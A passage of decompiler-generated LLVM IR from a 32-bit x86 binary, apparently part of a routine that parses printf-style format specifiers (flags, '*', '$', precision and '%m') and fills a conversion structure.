  %v11_8051b54 = icmp eq i8 %v2_8051b54, 42
  %v1_8051b57 = icmp eq i1 %v11_8051b54, false
  br i1 %v1_8051b57, label %dec_label_pc_8051b8d, label %dec_label_pc_8051b59

dec_label_pc_8051b59:                             ; preds = %dec_label_pc_8051b54
  %v4_8051b59 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_8051b59, label %dec_label_pc_8051b7d, label %dec_label_pc_8051b60

dec_label_pc_8051b60:                             ; preds = %dec_label_pc_8051b59
  %v1_8051b60 = inttoptr i32 %v1_8051b80 to i8*
  %v2_8051b60 = load i8, i8* %v1_8051b60, align 1
  %v11_8051b60 = icmp eq i8 %v2_8051b60, 36
  %v1_8051b63 = icmp eq i1 %v11_8051b60, false
  br i1 %v1_8051b63, label %dec_label_pc_8051da5, label %dec_label_pc_8051b69

dec_label_pc_8051b69:                             ; preds = %dec_label_pc_8051b60
  %tmp91 = icmp slt i32 %v0_8051b77, 1
  br i1 %tmp91, label %dec_label_pc_8051da5, label %dec_label_pc_8051b71

dec_label_pc_8051b71:                             ; preds = %dec_label_pc_8051b69
  store i32 %v8_8051a87, i32* %eax.global-to-local, align 4
  %v1_8051b76 = add i32 %v1_8051b80, 1
  store i32 %v1_8051b76, i32* @esi, align 4
  %v1_8051b77 = load i32, i32* @esp, align 4
  %v3_8051b77 = add i32 %v8_8051a87, 68
  %v4_8051b77 = add i32 %v3_8051b77, %v1_8051b77
  %v5_8051b77 = inttoptr i32 %v4_8051b77 to i32*
  store i32 %v0_8051b77, i32* %v5_8051b77, align 4
  %v0_8051bbb.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051b88

dec_label_pc_8051b7d:                             ; preds = %dec_label_pc_8051b59
  %v1_8051b7d = add i32 %v0_8051b7d, 1
  store i32 %v1_8051b7d, i32* %eax.global-to-local, align 4
  %v12_8051b80 = icmp eq i32 %v1_8051b7d, %v1_8051b80
  %v1_8051b82 = icmp eq i1 %v12_8051b80, false
  br i1 %v1_8051b82, label %dec_label_pc_8051da5, label %dec_label_pc_8051b88

dec_label_pc_8051b88:                             ; preds = %dec_label_pc_8051b7d, %dec_label_pc_8051b71
  %v0_8051bbb.pre.pre.pre = phi i32 [ %v1_8051b80, %dec_label_pc_8051b7d ], [ %v0_8051bbb.pre.pre.pre.pre, %dec_label_pc_8051b71 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051b8d

dec_label_pc_8051b8d:                             ; preds = %dec_label_pc_8051b54, %dec_label_pc_8051b88
  %v0_8051bbb.pre.pre = phi i32 [ %v1_8051b80, %dec_label_pc_8051b54 ], [ %v0_8051bbb.pre.pre.pre, %dec_label_pc_8051b88 ]
  %v0_8051a26 = phi i32 [ %v0_8051b77, %dec_label_pc_8051b54 ], [ -2147483648, %dec_label_pc_8051b88 ]
  %v4_8051b8d = trunc i64 %stack_var_-92.1.ph to i32
  %v5_8051b8d = icmp eq i32 %v4_8051b8d, 0
  %v1_8051b92 = icmp eq i1 %v5_8051b8d, false
  %.pre = inttoptr i32 %v0_8051bbb.pre.pre to i8*
  br i1 %v1_8051b92, label %dec_label_pc_8051bb6, label %dec_label_pc_8051b98

dec_label_pc_8051b98:                             ; preds = %dec_label_pc_8051b8d
  %v2_8051b98 = load i8, i8* %.pre, align 1
  %v11_8051b98 = icmp eq i8 %v2_8051b98, 46
  %v1_8051b9b = icmp eq i1 %v11_8051b98, false
  br i1 %v1_8051b9b, label %dec_label_pc_8051baf, label %dec_label_pc_8051b9d

dec_label_pc_8051b9d:                             ; preds = %dec_label_pc_8051b98
  %v1_8051b9d = add i32 %v0_8051bbb.pre.pre, 1
  store i32 %v1_8051b9d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051a80.outer

dec_label_pc_8051baf:                             ; preds = %dec_label_pc_8051b98
  br label %dec_label_pc_8051bb6

dec_label_pc_8051bb6:                             ; preds = %dec_label_pc_8051b8d, %dec_label_pc_8051baf
  %stack_var_-96.2 = phi i32 [ %v0_8051a26, %dec_label_pc_8051baf ], [ %stack_var_-96.1.ph, %dec_label_pc_8051b8d ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_8051baf ], [ %v0_8051a26, %dec_label_pc_8051b8d ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_805c0b8.316 to i32), i32* @edx, align 4
  %v4_8051bbb.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051bbb

dec_label_pc_8051bbb:                             ; preds = %dec_label_pc_8051bc5, %dec_label_pc_8051bb6
  %v0_8051bc5 = phi i32 [ %v1_8051bc5, %dec_label_pc_8051bc5 ], [ ptrtoint ([9 x i8]* @global_var_805c0b8.316 to i32), %dec_label_pc_8051bb6 ]
  %v4_8051bbb = phi i32 [ %v6_8051bbb, %dec_label_pc_8051bc5 ], [ %v4_8051bbb.pre, %dec_label_pc_8051bb6 ]
  %v2_8051bbb = load i8, i8* %.pre, align 1
  %v3_8051bbb = zext i8 %v2_8051bbb to i32
  %v5_8051bbb = and i32 %v4_8051bbb, -256
  %v6_8051bbb = or i32 %v3_8051bbb, %v5_8051bbb
  store i32 %v6_8051bbb, i32* %eax.global-to-local, align 4
  %v3_8051bbd = inttoptr i32 %v0_8051bc5 to i8*
  %v4_8051bbd = load i8, i8* %v3_8051bbd, align 1
  %v15_8051bbd = icmp eq i8 %v2_8051bbb, %v4_8051bbd
  br i1 %v15_8051bbd, label %dec_label_pc_8051a2d, label %dec_label_pc_8051bc5

dec_label_pc_8051bc5:                             ; preds = %dec_label_pc_8051bbb
  %v1_8051bc5 = add i32 %v0_8051bc5, 1
  store i32 %v1_8051bc5, i32* @edx, align 4
  %v1_8051bc6 = inttoptr i32 %v1_8051bc5 to i8*
  %v2_8051bc6 = load i8, i8* %v1_8051bc6, align 1
  %v3_8051bc6 = icmp eq i8 %v2_8051bc6, 0
  %v1_8051bc9 = icmp eq i1 %v3_8051bc6, false
  br i1 %v1_8051bc9, label %dec_label_pc_8051bbb, label %dec_label_pc_8051bcb

dec_label_pc_8051bcb:                             ; preds = %dec_label_pc_8051bc5, %dec_label_pc_8051a2d
  %v0_8051bde = phi i32 [ %v1_8051a2d, %dec_label_pc_8051a2d ], [ %v0_8051bbb.pre.pre, %dec_label_pc_8051bc5 ]
  %v0_8051bdb = phi i32 [ %v0_8051bc5, %dec_label_pc_8051a2d ], [ %v1_8051bc5, %dec_label_pc_8051bc5 ]
  %v1_8051bcd = add i32 %v0_8051bdb, -134594744
  %v1_8051bd2 = add i32 %v0_8051bdb, -134594745
  %v5_8051bd2 = sub i32 134594744, %v0_8051bdb
  %v6_8051bd2 = and i32 %v1_8051bcd, %v5_8051bd2
  %v7_8051bd2 = icmp slt i32 %v6_8051bd2, 0
  %v8_8051bd2 = icmp eq i32 %v1_8051bd2, 0
  %v9_8051bd2 = icmp slt i32 %v1_8051bd2, 0
  store i32 %v1_8051bd2, i32* %eax.global-to-local, align 4
  %v3_8051bd3 = icmp eq i1 %v9_8051bd2, %v7_8051bd2
  %v4_8051bd3 = icmp eq i1 %v8_8051bd2, false
  %v5_8051bd3 = and i1 %v4_8051bd3, %v3_8051bd3
  br i1 %v5_8051bd3, label %dec_label_pc_8051bdf, label %dec_label_pc_8051bd5

dec_label_pc_8051bd5:                             ; preds = %dec_label_pc_8051bcb
  %v1_8051bd5 = inttoptr i32 %v0_8051bde to i8*
  %v2_8051bd5 = load i8, i8* %v1_8051bd5, align 1
  %v3_8051bd5 = zext i8 %v2_8051bd5 to i32
  %v5_8051bd5 = and i32 %v1_8051bd2, -256
  %v6_8051bd5 = or i32 %v3_8051bd5, %v5_8051bd5
  store i32 %v6_8051bd5, i32* %eax.global-to-local, align 4
  %v3_8051bd7 = inttoptr i32 %v0_8051bdb to i8*
  %v4_8051bd7 = load i8, i8* %v3_8051bd7, align 1
  %v15_8051bd7 = icmp eq i8 %v2_8051bd5, %v4_8051bd7
  %v1_8051bd9 = icmp eq i1 %v15_8051bd7, false
  br i1 %v1_8051bd9, label %dec_label_pc_8051bdf, label %dec_label_pc_8051bdb

dec_label_pc_8051bdb:                             ; preds = %dec_label_pc_8051bd5
  %v1_8051bdb = add i32 %v0_8051bdb, 9
  store i32 %v1_8051bdb, i32* @edx, align 4
  %v1_8051bde = add i32 %v0_8051bde, 1
  store i32 %v1_8051bde, i32* @esi, align 4
  br label %dec_label_pc_8051bdf

dec_label_pc_8051bdf:                             ; preds = %dec_label_pc_8051bd5, %dec_label_pc_8051bcb, %dec_label_pc_8051bdb
  %v4_8051be3 = phi i32 [ %v6_8051bd5, %dec_label_pc_8051bd5 ], [ %v1_8051bd2, %dec_label_pc_8051bcb ], [ %v6_8051bd5, %dec_label_pc_8051bdb ]
  %v0_8051be3 = phi i32 [ %v0_8051bde, %dec_label_pc_8051bd5 ], [ %v0_8051bde, %dec_label_pc_8051bcb ], [ %v1_8051bde, %dec_label_pc_8051bdb ]
  %v0_8051bdf = phi i32 [ %v0_8051bdb, %dec_label_pc_8051bd5 ], [ %v0_8051bdb, %dec_label_pc_8051bcb ], [ %v1_8051bdb, %dec_label_pc_8051bdb ]
  %v1_8051bdf = add i32 %v0_8051bdf, 9
  %v2_8051bdf = inttoptr i32 %v1_8051bdf to i8*
  %v3_8051bdf = load i8, i8* %v2_8051bdf, align 1
  %v4_8051bdf = sext i8 %v3_8051bdf to i32
  store i32 %v4_8051bdf, i32* %ebx.global-to-local, align 4
  %v1_8051be3 = inttoptr i32 %v0_8051be3 to i8*
  %v2_8051be3 = load i8, i8* %v1_8051be3, align 1
  %v3_8051be3 = zext i8 %v2_8051be3 to i32
  %v5_8051be3 = and i32 %v4_8051be3, -256
  %v6_8051be3 = or i32 %v3_8051be3, %v5_8051be3
  store i32 %v6_8051be3, i32* %eax.global-to-local, align 4
  %v2_8051be5 = mul nsw i32 %v4_8051bdf, 256
  store i32 %v2_8051be5, i32* %ebx.global-to-local, align 4
  %v4_8051be8 = icmp eq i8 %v2_8051be3, 0
  br i1 %v4_8051be8, label %dec_label_pc_8051da5, label %dec_label_pc_8051bf0

dec_label_pc_8051bf0:                             ; preds = %dec_label_pc_8051bdf
  %v3_8051bf0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8051bf0, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_805c0f5.317 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051bf9

dec_label_pc_8051bf9:                             ; preds = %dec_label_pc_8051c49, %dec_label_pc_8051bf0
  %v0_8051c49 = phi i32 [ %v1_8051c49, %dec_label_pc_8051c49 ], [ ptrtoint ([21 x i8]* @global_var_805c0f5.317 to i32), %dec_label_pc_8051bf0 ]
  %v3_8051bf9 = inttoptr i32 %v0_8051c49 to i8*
  %v4_8051bf9 = load i8, i8* %v3_8051bf9, align 1
  %v15_8051bf9 = icmp eq i8 %v2_8051be3, %v4_8051bf9
  %v1_8051bfb = icmp eq i1 %v15_8051bf9, false
  br i1 %v1_8051bfb, label %dec_label_pc_8051c49, label %dec_label_pc_8051bfd

dec_label_pc_8051bfd:                             ; preds = %dec_label_pc_8051bf9
  %v1_8051bff = add i32 %v0_8051c49, -134594805
  store i32 %v1_8051bff, i32* %edx.global-to-local, align 4
  %v7_8051c08 = icmp sgt i32 %v1_8051bff, 17
  br i1 %v7_8051c08, label %dec_label_pc_8051c0a, label %dec_label_pc_8051c13

dec_label_pc_8051c0a:                             ; preds = %dec_label_pc_8051bfd
  %v1_8051c0a = add i32 %v0_8051c49, -134594807
  store i32 %v1_8051c0a, i32* %eax.global-to-local, align 4
  %v3_8051c0d = and i32 %v2_8051be5, 1024
  %v4_8051c0d = icmp eq i32 %v3_8051c0d, 0
  %v1_8051c10 = icmp eq i1 %v4_8051c0d, false
  %v4_8051c10 = select i1 %v1_8051c10, i32 %v1_8051c0a, i32 %v1_8051bff
  store i32 %v4_8051c10, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c13

dec_label_pc_8051c13:                             ; preds = %dec_label_pc_8051bfd, %dec_label_pc_8051c0a
  %v0_8051c1c = phi i32 [ %v1_8051bff, %dec_label_pc_8051bfd ], [ %v4_8051c10, %dec_label_pc_8051c0a ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805c0eb.318 to i32), i32* %ecx.global-to-local, align 4
  %v2_8051c1c = add i32 %tmp76, 32
  %v3_8051c1c = inttoptr i32 %v2_8051c1c to i32*
  store i32 %v0_8051c1c, i32* %v3_8051c1c, align 4
  %v0_8051c1f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8051c23.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c1f

dec_label_pc_8051c1f:                             ; preds = %dec_label_pc_8051c1f, %dec_label_pc_8051c13
  %v0_8051c1f = phi i32 [ %v1_8051c1f, %dec_label_pc_8051c1f ], [ %v0_8051c1f.pre, %dec_label_pc_8051c13 ]
  %v1_8051c1f = add i32 %v0_8051c1f, 1
  store i32 %v1_8051c1f, i32* %ecx.global-to-local, align 4
  %v1_8051c20 = inttoptr i32 %v1_8051c1f to i8*
  %v2_8051c20 = load i8, i8* %v1_8051c20, align 1
  %v3_8051c20 = sext i8 %v2_8051c20 to i32
  store i32 %v3_8051c20, i32* %eax.global-to-local, align 4
  %v8_8051c25 = icmp sgt i32 %v0_8051c23.pre, %v3_8051c20
  br i1 %v8_8051c25, label %dec_label_pc_8051c1f, label %dec_label_pc_8051c27

dec_label_pc_8051c27:                             ; preds = %dec_label_pc_8051c1f
  store i32 ptrtoint ([21 x i8]* @global_var_805c0f5.317 to i32), i32* @ecx, align 4
  %v1_8051c2e = add i32 %v0_8051c1f, -134594795
  store i32 %v1_8051c2e, i32* %eax.global-to-local, align 4
  %v2_8051c33 = add i32 %v0_8051c1f, add (i32 ptrtoint (i32* @global_var_805c0dc.319 to i32), i32 -134594795)
  %v3_8051c33 = add i32 %v2_8051c33, %v1_8051c2e
  %v4_8051c33 = inttoptr i32 %v3_8051c33 to i16*
  %v5_8051c33 = load i16, i16* %v4_8051c33, align 2
  %v6_8051c33 = sext i16 %v5_8051c33 to i32
  store i32 %v6_8051c33, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_8051c2e, 2
  %v3_8051c3b = add i32 %factor, 134594764
  %v4_8051c3b = inttoptr i32 %v3_8051c3b to i16*
  %v5_8051c3b = load i16, i16* %v4_8051c3b, align 2
  %v6_8051c3b = sext i16 %v5_8051c3b to i32
  store i32 %v6_8051c3b, i32* %eax.global-to-local, align 4
  %v1_8051c43 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051c43 = or i32 %v1_8051c43, %v6_8051c33
  %v2_8051c45 = and i32 %v2_8051c43, %v6_8051c3b
  store i32 %v2_8051c45, i32* %edx.global-to-local, align 4
  %v0_8051c57.pre = load i32, i32* @esi, align 4
  %v0_8051c5a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051c4f

dec_label_pc_8051c49:                             ; preds = %dec_label_pc_8051bf9
  %v1_8051c49 = add i32 %v0_8051c49, 1
  store i32 %v1_8051c49, i32* @ecx, align 4
  %v1_8051c4a = inttoptr i32 %v1_8051c49 to i8*
  %v2_8051c4a = load i8, i8* %v1_8051c4a, align 1
  %v3_8051c4a = icmp eq i8 %v2_8051c4a, 0
  %v1_8051c4d = icmp eq i1 %v3_8051c4a, false
  br i1 %v1_8051c4d, label %dec_label_pc_8051bf9, label %dec_label_pc_8051c4f

dec_label_pc_8051c4f:                             ; preds = %dec_label_pc_8051c49, %dec_label_pc_8051c27
  %v0_8051c5a = phi i32 [ %v0_8051c5a.pre, %dec_label_pc_8051c27 ], [ %storemerge4, %dec_label_pc_8051c49 ]
  %v0_8051c57 = phi i32 [ %v0_8051c57.pre, %dec_label_pc_8051c27 ], [ %v0_8051be3, %dec_label_pc_8051c49 ]
  %v0_8051c4f = phi i32 [ %v2_8051c45, %dec_label_pc_8051c27 ], [ %v3_8051bf0, %dec_label_pc_8051c49 ]
  store i32 %v0_8051c4f, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_8051c57 = inttoptr i32 %v0_8051c57 to i8*
  %v2_8051c57 = load i8, i8* %v1_8051c57, align 1
  %v3_8051c57 = sext i8 %v2_8051c57 to i32
  store i32 %v3_8051c57, i32* %eax.global-to-local, align 4
  %v2_8051c5a = add i32 %tmp76, 4
  %v3_8051c5a = inttoptr i32 %v2_8051c5a to i32*
  store i32 %v0_8051c5a, i32* %v3_8051c5a, align 4
  %v0_8051c5d = load i32, i32* %eax.global-to-local, align 4
  %v1_8051c5d = load i32, i32* @edx, align 4
  %v2_8051c5d = add i32 %v1_8051c5d, 12
  %v3_8051c5d = inttoptr i32 %v2_8051c5d to i32*
  store i32 %v0_8051c5d, i32* %v3_8051c5d, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_8051c64 = load i32, i32* @edx, align 4
  %v1_8051c64 = add i32 %v0_8051c64, 28
  %v2_8051c64 = inttoptr i32 %v1_8051c64 to i32*
  store i32 1, i32* %v2_8051c64, align 4
  %v0_8051c6b = load i32, i32* %eax.global-to-local, align 4
  %v1_8051c6b = load i32, i32* @edx, align 4
  %v2_8051c6b = add i32 %v1_8051c6b, 8
  %v3_8051c6b = inttoptr i32 %v2_8051c6b to i32*
  store i32 %v0_8051c6b, i32* %v3_8051c6b, align 4
  %v0_8051c6e = load i32, i32* %edi.global-to-local, align 4
  %v1_8051c78 = and i32 %v0_8051c6e, -5
  %v0_8051c7e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051c7e = and i32 %v0_8051c7e, 3840
  store i32 %v1_8051c7e, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_8051c87 = or i32 %v1_8051c7e, %v1_8051c78
  store i32 %v2_8051c87, i32* @edi, align 4
  %v1_8051c89 = load i32, i32* @edx, align 4
  %v2_8051c89 = add i32 %v1_8051c89, 20
  %v3_8051c89 = inttoptr i32 %v2_8051c89 to i32*
  store i32 48, i32* %v3_8051c89, align 4
  %v0_8051c8c = load i32, i32* @edi, align 4
  %v1_8051c8c = load i32, i32* @edx, align 4
  %v2_8051c8c = add i32 %v1_8051c8c, 16
  %v3_8051c8c = inttoptr i32 %v2_8051c8c to i32*
  store i32 %v0_8051c8c, i32* %v3_8051c8c, align 4
  %v0_8051c8f = load i32, i32* @ecx, align 4
  %v1_8051c8f = inttoptr i32 %v0_8051c8f to i8*
  %v2_8051c8f = load i8, i8* %v1_8051c8f, align 1
  %v3_8051c8f = icmp eq i8 %v2_8051c8f, 0
  %v1_8051c92 = icmp eq i1 %v3_8051c8f, false
  br i1 %v1_8051c92, label %dec_label_pc_8051cab, label %dec_label_pc_8051c94

dec_label_pc_8051c94:                             ; preds = %dec_label_pc_8051c4f
  %v0_8051c94 = load i32, i32* @esi, align 4
  %v1_8051c94 = inttoptr i32 %v0_8051c94 to i8*
  %v2_8051c94 = load i8, i8* %v1_8051c94, align 1
  %v11_8051c94 = icmp eq i8 %v2_8051c94, 109
  %v1_8051c97 = icmp eq i1 %v11_8051c94, false
  br i1 %v1_8051c97, label %dec_label_pc_8051da5, label %dec_label_pc_8051c9d

dec_label_pc_8051c9d:                             ; preds = %dec_label_pc_8051c94
  %v0_8051c9d = load i32, i32* @edx, align 4
  %v1_8051c9d = add i32 %v0_8051c9d, 32
  %v2_8051c9d = inttoptr i32 %v1_8051c9d to i32*
  store i32 20, i32* %v2_8051c9d, align 4
  %v0_8051ca4 = load i32, i32* @edx, align 4
  %v1_8051ca4 = add i32 %v0_8051ca4, 28
  %v2_8051ca4 = inttoptr i32 %v1_8051ca4 to i32*
  store i32 0, i32* %v2_8051ca4, align 4
  br label %dec_label_pc_8051cab

dec_label_pc_8051cab:                             ; preds = %dec_label_pc_8051c4f, %dec_label_pc_8051c9d
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_8051d47, label %dec_label_pc_8051cb6

dec_label_pc_8051cb6:                             ; preds = %dec_label_pc_8051cab
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_8051d2f = add i32 %tmp76, 40
  %v4_8051cc5 = add i32 %tmp76, 36
  %v1_8051d38 = add i32 %tmp76, 28
  %v2_8051d38 = inttoptr i32 %v1_8051d38 to i32*
  br label %dec_label_pc_8051cb8

dec_label_pc_8051cb8:                             ; preds = %dec_label_pc_8051d33, %dec_label_pc_8051cb6
  %v0_8051cce = phi i32 [ 0, %dec_label_pc_8051cb6 ], [ %v1_8051d37, %dec_label_pc_8051d33 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051cb6 ], [ %stack_var_-88.5, %dec_label_pc_8051d33 ]
  %v1_8051cb8 = add i32 %v0_8051cce, -2
  %v6_8051cb8 = sub i32 1, %v0_8051cce
  %v7_8051cb8 = and i32 %v6_8051cb8, %v0_8051cce
  %v8_8051cb8 = icmp slt i32 %v7_8051cb8, 0
  %v9_8051cb8 = icmp eq i32 %v1_8051cb8, 0
  %v10_8051cb8 = icmp slt i32 %v1_8051cb8, 0
  %v3_8051cbb = icmp eq i1 %v10_8051cb8, %v8_8051cb8
  %v4_8051cbb = icmp eq i1 %v9_8051cb8, false
  %v5_8051cbb = and i1 %v4_8051cbb, %v3_8051cbb
  br i1 %v5_8051cbb, label %dec_label_pc_8051cce, label %dec_label_pc_8051cbd

dec_label_pc_8051cbd:                             ; preds = %dec_label_pc_8051cb8
  %v0_8051cbd = load i32, i32* @esp, align 4
  %v2_8051cbd = mul i32 %v0_8051cce, 4
  %v3_8051cbd = add i32 %v2_8051cbd, 68
  %v4_8051cbd = add i32 %v3_8051cbd, %v0_8051cbd
  %v5_8051cbd = inttoptr i32 %v4_8051cbd to i32*
  %v6_8051cbd = load i32, i32* %v5_8051cbd, align 4
  store i32 %v6_8051cbd, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_8051cc5 = trunc i32 %v6_8051cbd to i8
  %v5_8051cc5 = add i32 %v4_8051cc5, %v0_8051cce
  %v6_8051cc5 = inttoptr i32 %v5_8051cc5 to i8*
  store i8 %v1_8051cc5, i8* %v6_8051cc5, align 1
  %v0_8051cc9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051cc9 = urem i32 %v0_8051cc9, 256
  br label %dec_label_pc_8051cd7

dec_label_pc_8051cce:                             ; preds = %dec_label_pc_8051cb8
  %v5_8051cd0 = add i32 %v0_8051cce, %stack_var_-32.3
  store i32 %v5_8051cd0, i32* %eax.global-to-local, align 4
  %v1_8051cd4 = add i32 %v5_8051cd0, -2
  br label %dec_label_pc_8051cd7

dec_label_pc_8051cd7:                             ; preds = %dec_label_pc_8051cbd, %dec_label_pc_8051cce
  %v0_8051cea = phi i32 [ %v1_8051cc9, %dec_label_pc_8051cbd ], [ %v1_8051cd4, %dec_label_pc_8051cce ]
  store i32 %v0_8051cea, i32* %eax.global-to-local, align 4
  %v5_8051cd7 = sub i32 %v0_8051cea, %stack_var_-88.4
  %v11_8051cd7 = xor i32 %v0_8051cea, %stack_var_-88.4
  %v12_8051cd7 = xor i32 %v5_8051cd7, %v0_8051cea
  %v13_8051cd7 = and i32 %v12_8051cd7, %v11_8051cd7
  %v14_8051cd7 = icmp slt i32 %v13_8051cd7, 0
  %v15_8051cd7 = icmp eq i32 %v5_8051cd7, 0
  %v16_8051cd7 = icmp slt i32 %v5_8051cd7, 0
  %v3_8051cdb = icmp ne i1 %v16_8051cd7, %v14_8051cd7
  %v4_8051cdb = or i1 %v15_8051cd7, %v3_8051cdb
  br i1 %v4_8051cdb, label %dec_label_pc_8051cea, label %dec_label_pc_8051cdd

dec_label_pc_8051cdd:                             ; preds = %dec_label_pc_8051cd7
  %v1_8051cdd = add i32 %v0_8051cea, -9
  %v6_8051cdd = sub i32 8, %v0_8051cea
  %v7_8051cdd = and i32 %v6_8051cdd, %v0_8051cea
  %v8_8051cdd = icmp slt i32 %v7_8051cdd, 0
  %v9_8051cdd = icmp eq i32 %v1_8051cdd, 0
  %v10_8051cdd = icmp slt i32 %v1_8051cdd, 0
  %v3_8051ce0 = icmp eq i1 %v10_8051cdd, %v8_8051cdd
  %v4_8051ce0 = icmp eq i1 %v9_8051cdd, false
  %v5_8051ce0 = and i1 %v4_8051ce0, %v3_8051ce0
  br i1 %v5_8051ce0, label %dec_label_pc_8051da5, label %dec_label_pc_8051cea

dec_label_pc_8051cea:                             ; preds = %dec_label_pc_8051cdd, %dec_label_pc_8051cd7
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_8051cd7 ], [ %v0_8051cea, %dec_label_pc_8051cdd ]
  %v1_8051cea = add i32 %v0_8051cea, -1
  store i32 %v1_8051cea, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_8051cf3 = load i32, i32* @esp, align 4
  %v1_8051cf3 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051cf3 = mul i32 %v1_8051cf3, 4
  %v3_8051cf3 = add i32 %v0_8051cf3, 80
  %v4_8051cf3 = add i32 %v3_8051cf3, %v2_8051cf3
  %v5_8051cf3 = inttoptr i32 %v4_8051cf3 to i32*
  %v6_8051cf3 = load i32, i32* %v5_8051cf3, align 4
  store i32 %v6_8051cf3, i32* %edi.global-to-local, align 4
  %v2_8051cf7 = mul i32 %v1_8051cea, 4
  %v4_8051cf7 = add i32 %v4_8051d2f, %v2_8051cf7
  %v5_8051cf7 = inttoptr i32 %v4_8051cf7 to i32*
  %v6_8051cf7 = load i32, i32* %v5_8051cf7, align 4
  store i32 %v6_8051cf7, i32* @eax, align 4
  %v9_8051cfb = icmp eq i32 %v6_8051cf3, 8
  br i1 %v9_8051cfb, label %dec_label_pc_8051d33, label %dec_label_pc_8051d00

dec_label_pc_8051d00:                             ; preds = %dec_label_pc_8051cea
  %v9_8051d00 = icmp eq i32 %v6_8051cf7, 8
  br i1 %v9_8051d00, label %dec_label_pc_8051d23, label %dec_label_pc_8051d05

dec_label_pc_8051d05:                             ; preds = %dec_label_pc_8051d00
  %v12_8051d05 = icmp eq i32 %v6_8051cf7, %v6_8051cf3
  br i1 %v12_8051d05, label %dec_label_pc_8051d23, label %dec_label_pc_8051d09

dec_label_pc_8051d09:                             ; preds = %dec_label_pc_8051d05
  %v1_8051d09 = call i32 @function_80519b8(i32 %v1_8051cea)
  store i32 %v1_8051d09, i32* %ebx.global-to-local, align 4
  %v0_8051d10 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8051d10, i32* @eax, align 4
  %v1_8051d12 = call i32 @function_80519b8(i32 %v1_8051cea)
  %v2_8051d17 = sub i32 %v1_8051d09, %v1_8051d12
  %v8_8051d17 = xor i32 %v1_8051d09, %v1_8051d12
  %v9_8051d17 = xor i32 %v2_8051d17, %v1_8051d09
  %v10_8051d17 = and i32 %v9_8051d17, %v8_8051d17
  %v11_8051d17 = icmp slt i32 %v10_8051d17, 0
  %v12_8051d17 = icmp eq i32 %v2_8051d17, 0
  %v13_8051d17 = icmp slt i32 %v2_8051d17, 0
  %v3_8051d19 = icmp ne i1 %v13_8051d17, %v11_8051d17
  %v4_8051d19 = or i1 %v12_8051d17, %v3_8051d19
  %v5_8051d19 = zext i1 %v4_8051d19 to i32
  store i32 %v5_8051d19, i32* %eax.global-to-local, align 4
  %v1_8051d1f = icmp eq i1 %v4_8051d19, false
  br i1 %v1_8051d1f, label %dec_label_pc_8051d33, label %dec_label_pc_8051d09.dec_label_pc_8051d23_crit_edge

dec_label_pc_8051d09.dec_label_pc_8051d23_crit_edge: ; preds = %dec_label_pc_8051d09
  %v0_8051d23.pre = load i32, i32* @esp, align 4
  %v1_8051d23.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051d23

dec_label_pc_8051d23:                             ; preds = %dec_label_pc_8051d09.dec_label_pc_8051d23_crit_edge, %dec_label_pc_8051d05, %dec_label_pc_8051d00
  %v1_8051d23 = phi i32 [ %v1_8051d23.pre, %dec_label_pc_8051d09.dec_label_pc_8051d23_crit_edge ], [ %v1_8051cf3, %dec_label_pc_8051d05 ], [ %v1_8051cf3, %dec_label_pc_8051d00 ]
  %v0_8051d23 = phi i32 [ %v0_8051d23.pre, %dec_label_pc_8051d09.dec_label_pc_8051d23_crit_edge ], [ %v0_8051cf3, %dec_label_pc_8051d05 ], [ %v0_8051cf3, %dec_label_pc_8051d00 ]
  %v2_8051d23 = mul i32 %v1_8051d23, 4
  %v3_8051d23 = add i32 %v0_8051d23, 80
  %v4_8051d23 = add i32 %v3_8051d23, %v2_8051d23
  %v5_8051d23 = inttoptr i32 %v4_8051d23 to i32*
  %v6_8051d23 = load i32, i32* %v5_8051d23, align 4
  store i32 %v6_8051d23, i32* %eax.global-to-local, align 4
  store i32 %v1_8051cea, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_8051d23, i32* %v5_8051cf7, align 4
  br label %dec_label_pc_8051d33

dec_label_pc_8051d33:                             ; preds = %dec_label_pc_8051d09, %dec_label_pc_8051cea, %dec_label_pc_8051d23
  store i32 %tmp76, i32* @ecx, align 4
  %v0_8051d37 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051d37 = add i32 %v0_8051d37, 1
  store i32 %v1_8051d37, i32* %ebp.global-to-local, align 4
  %v3_8051d38 = load i32, i32* %v2_8051d38, align 4
  %v1_8051d3b = add i32 %v3_8051d38, 2
  store i32 %v1_8051d3b, i32* %eax.global-to-local, align 4
